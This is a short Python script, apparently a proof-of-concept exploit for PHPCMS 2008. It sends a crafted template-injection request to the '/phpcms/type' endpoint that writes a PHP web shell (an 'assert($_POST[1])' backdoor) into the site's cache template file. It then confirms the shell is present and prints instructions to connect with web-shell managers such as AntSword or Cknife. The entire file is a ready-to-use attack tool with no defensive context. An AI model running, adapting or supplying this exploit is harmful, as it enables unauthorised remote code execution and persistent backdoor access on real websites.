#coding:utf-8

import requests
import sys
import argparse
import pyfiglet
import os




def options():
    parser = argparse.ArgumentParser(description='Vxscan V1.0')
    parser.add_argument('-u','--url',help='vulnable target url')
    parser.add_argument('-p','--password',help='antsword or ckinfe connect password')
    
    args = parser.parse_args()



    if args.url:
        print('\033[94m[*]starting exploit!\033[0m')
        geturl=args.url
        if 'http' not in geturl:
            url='http://'+args.url
        geturl=url+'/phpcms/type?templat=tag_(){};@unlink(FILE);assert($_POST[1]);{//../rss'
        r1=requests.get(url=geturl)
        
        testurl=url+'/phpcms/data/cache_template/rss.tpl.php'
        r2=requests.get(url=testurl)
        if r2.status_code==200:
            print("\033[92mSucessful!!\033[0m")
            if args.password:
                print("please connect by using antsword or cknife with password [\033[92m"+args.password+'\033[0m]to test!!')
            else:
                print("please connect by using antsword or cknife with password [\033[92m1\033[0m] to test!!")
        else:
            print("\033[91mFailed\033[0m")
    else:
        print("\033[94m@usage:python3 "+sys.argv[0]+" -u [url] <-c> [code]\033[0m")



def banner():
    ascii_banner = pyfiglet.figlet_format("phpcms2008poc")
    print('\033[92m'+ascii_banner+'\033[0m')


def main():
    try:
        os.system('clear')
        banner()
        options()
    except KeyboardInterrupt:
        print('\nCtrl+C Stop running\n')
        sys.exit(0)


if __name__=="__main__":
    main()
